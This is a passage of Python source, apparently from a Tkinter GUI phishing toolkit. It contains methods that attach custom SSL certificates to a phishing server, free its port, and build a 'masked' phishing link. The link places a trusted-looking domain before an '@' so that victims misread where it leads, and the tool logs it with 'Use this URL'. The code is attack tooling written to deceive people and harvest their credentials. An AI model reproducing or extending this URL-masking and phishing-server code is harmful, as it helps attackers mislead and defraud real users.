    def toggle_ssl_file_phishing(self, event=None):
            if self.selected_cert_file_phishing or self.selected_key_file_phishing:
                self.selected_cert_file_phishing = None
                self.selected_key_file_phishing = None
                self.ssl_img_phishing.config(image=self.checkbox_unchecked_icon)
                self.ssl_entry_phishing.config(fg="#515151")
                return
            file_paths = filedialog.askopenfilenames(
                parent=self.window_phishing,title="Select Custom SSL/TLS Certification",
                filetypes=[("SSL/TLS files", "*.pem *.crt *.key")]
            )
            if not file_paths: return
            cert_file = None
            key_file = None
            for path in file_paths:
                if path.endswith((".pem", ".crt")) and "key" not in os.path.basename(path).lower():
                    cert_file = path
                elif path.endswith((".pem", ".key")) or "key" in os.path.basename(path).lower():
                    key_file = path
            if cert_file and key_file:
                self.selected_cert_file_phishing = cert_file
                self.selected_key_file_phishing = key_file
                self.ssl_img_phishing.config(image=self.checkbox_checked_icon)
                self.ssl_entry_phishing.config(fg="#FFFFFF")
            else:
                messagebox.showerror("Error","You must select both Certificate (.crt.pem) and Key (.key) files!",parent=self.window_phishing)
                self.selected_cert_file_phishing = None
                self.selected_key_file_phishing = None
                self.ssl_img_phishing.config(image=self.checkbox_unchecked_icon)
                self.ssl_entry_phishing.config(fg="#515151")   
                            
    def check_port_conflicts_phishing(self, port):
        try:
            result = subprocess.run(['lsof', '-i', f':{port}'], capture_output=True, text=True)
            if result.stdout:
                self.log(f"Port {port} in use. Attempting to free it...", error=True)
                if not self.stopping_phishing:
                    self.stop_phishing()
                time.sleep(1)
                result = subprocess.run(['lsof', '-i', f':{port}'], capture_output=True, text=True)
                if not result.stdout:
                    self.log(f"Port {port} freed successfully")
                else:
                    self.log(f"Failed to free port {port}. Try a different port.", error=True)
                    return False
            return True
        except Exception as e:
            self.log(f"Port conflict check error: {str(e)}", error=True)
            return False

    def create_masked_url(self, public_url):
        url_mask = self.url_mask_entry.get().strip()
        if not url_mask:
            return public_url
        if not url_mask.startswith("http"):
            url_mask = f"https://{url_mask}"
        encoded_url = urllib.parse.quote(public_url, safe='')
        masked_url = f"{url_mask}@{public_url.split('//')[1]}"
        return masked_url

    def update_phishing_url(self, public_url):
        self.url_entry.configure(state='normal')
        self.url_entry.delete(0, tk.END)
        if public_url:
            masked_url = self.create_masked_url(public_url)
            self.url_entry.insert(0, masked_url)
            self.log(f"Use this URL : {masked_url}")
        else:
            self.url_entry.insert(0, "Failed to generate server URL")
            self.log("Failed to generate server URL.", error=True)
        self.url_entry.configure(state='readonly')

